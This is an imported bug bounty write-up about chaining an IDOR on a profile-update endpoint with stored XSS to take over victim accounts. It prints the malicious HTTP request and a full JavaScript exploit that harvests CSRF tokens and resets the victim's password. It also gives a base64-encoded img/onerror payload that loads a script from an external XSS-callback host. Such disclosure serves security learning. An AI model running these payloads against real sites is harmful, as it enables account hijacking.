---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-21_zero-click-to-account-takeover-idor-xss.md
original_filename: 2022-12-21_zero-click-to-account-takeover-idor-xss.md
title: Zero Click To Account Takeover (IDOR + XSS)
category: documents
detected_topics:
- idor
- xss
- command-injection
- otp
- cloud-security
tags:
- imported
- documents
- idor
- xss
- command-injection
- otp
- cloud-security
language: en
raw_sha256: 0ce908f7852e908768102a4dcf5e8da5d8df97d9790be25861d9c839734296e8
text_sha256: c3f74e8604d3192e0d66bf8e4dfb194d38cd947ffd57ad18910b0aa68de92db3
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: true
---

# Zero Click To Account Takeover (IDOR + XSS)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-21_zero-click-to-account-takeover-idor-xss.md
- Source Type: markdown
- Detected Topics: idor, xss, command-injection, otp, cloud-security
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: True
- Raw SHA256: `0ce908f7852e908768102a4dcf5e8da5d8df97d9790be25861d9c839734296e8`
- Text SHA256: `c3f74e8604d3192e0d66bf8e4dfb194d38cd947ffd57ad18910b0aa68de92db3`


## Content

---
title: "Zero Click To Account Takeover (IDOR + XSS)"
url: "https://m7arm4n.medium.com/zero-click-to-account-takeover-idor-xss-98dd6cce63c4"
authors: ["Arman (@M7arm4n)"]
bugs: ["IDOR", "XSS", "Account takeover"]
publication_date: "2022-12-21"
added_date: "2022-12-23"
source: "pentester.land/writeups.json"
original_index: 1751
scraped_via: "browseros"
---

# Zero Click To Account Takeover (IDOR + XSS)

Zero Click To Account Takeover (IDOR + XSS)
M7arm4n
Follow
3 min read
·
Dec 21, 2022

218

2

Hello dear friends, This write-up is about one of my findings on BugCrowd’s programs that lead attackers to use IDOR to inject XSS payload on the victim profile and send a request to update the password function till change victim's password.

Press enter or click to view image in full size

Recon is the most important part of the bug bounty. How much you spend more time recon, you have more chances to find critical vulnerabilities. The vulnerable domain was acquired by the company and I used Crunchbase and Google Dork to understand. I found 2 P1s and 1 P2 and 2 P3s on this fresh asset.

The IDOR was the simplest type of IDOR on an updated profile, and the attacker was able to update other user profiles via change the data[user][id] value parameter.

Press enter or click to view image in full size

When I found this vulnerability, decided to escalate the vulnerability and compile it with another thing. I realized the data[user][photo] is reflected in the src of the img tag. In one shot I realized able to close the src value of the IMG tag but was unable to close the img tag. I used the onerror event handler to execute Javascript on the victim account.

POST /users/update_my_profile HTTP/1.1
Host: www.target.com
...  
_method=POST&data[_Token][key]=6e8b90f4e7d7c694735d4f1c83db5968bf295f26&data[User][id]=808265&data[User][photo]=https://s3-us-west-2.amazonaws.com/target/nonexistent.png"+onerror=alert(origin)&data[User][photo_old]=&data[User][name]=Arman.Security&data[User][gender]=m&data[date][day]=&data[date][month]=&data[date][year]=&data[User][mobile_number]=&data[_Token][fields]=fa628e2b05473ddd3cbbee31d2d9c311eba4c9d5%3A&data[_Token][unlocked]=

And that return on profile like this:

Press enter or click to view image in full size

Now we have an IDOR and XSS, Now time to use XSS to account takeover or access the private information of the victim account.

The website work on a Cookie base and has 2 verification token on each request, one of them was stable and one of them is changeable for each function. The Important part was ignoring the old password to update the password=***REDACTED***

I had to write an exploit that lead me to collect all victim tokens and test all modes for variable tokens on the update password function.

Get M7arm4n’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

That was the exploit code:

url = "https://www.target.com/editar-mi-contrasena";
var token_keys_array = [];
var token_fields_array = [];
var params = [];
var body = "";
var xhr = new XMLHttpRequest();
xhr.responseType = "document";
xhr.open("GET", url, true);
xhr.withCredentials = true;
var xmlHttpRequest2 = new XMLHttpRequest();
xmlHttpRequest2.open("POST", "https://www.target.com/editar-mi-contrasena", true);
xmlHttpRequest2.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
xmlHttpRequest2.setRequestHeader("Referer", "https://www.target.com/editar-mi-contrasena");
xmlHttpRequest2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlHttpRequest2.setRequestHeader("Upgrade-Insecure-Requests", "1");
xmlHttpRequest2.setRequestHeader("Sec-Fetch-Mode", "navigate");
xmlHttpRequest2.setRequestHeader("Sec-Fetch-Dest", "document");
xmlHttpRequest2.setRequestHeader("Sec-Fetch-User", "?1");
xmlHttpRequest2.withCredentials = true;
xmlHttpRequest2.onreadystatechange = function () {
if (this.readyState == 4 && this.status == 302) {
print("response=" + this.responseText);
print("done");
};
};
xhr.onreadystatechange = function() {
if (xhr.readyState == 4){
xhr.response.querySelectorAll("input[name='data[_Token][key]']").forEach( input => {
token_keys_array.push(input.value)
});
xhr.response.querySelectorAll("input[name='data[_Token][fields]']").forEach( input => {
token_fields_array.push(input.value)
});
for (let b = 0; b < token_fields_array.length; b++) {
if (b == 2){
body = "_method=POST&data%5B_Token%5D%5Bkey%5D="+token_keys_array[0]+"&data%5BUser%5D%5Bpassword%5D=EvilOrAngel&data%5BUser%5D%5Bpassword_confirmation%5D=EvilOrAngel&data%5B_Token%5D%5Bfields%5D="+encodeURIComponent(token_fields_array[b])+"&data%5B_Token%5D%5Bunlocked%5D=";
xmlHttpRequest2.send(body);
};
};
};
};
xhr.send();

Convert the exploit code to Base64 encode then set on id value of the img tag and execute it by onerror=eval(atob(this.id)). Something like this:

"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVyLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>

Now IDOR helps to store the XSS payload on the victim account then the exploit helps us to take over the victim account. Easy Boy 😎

Press enter or click to view image in full size

Twitter 🐦
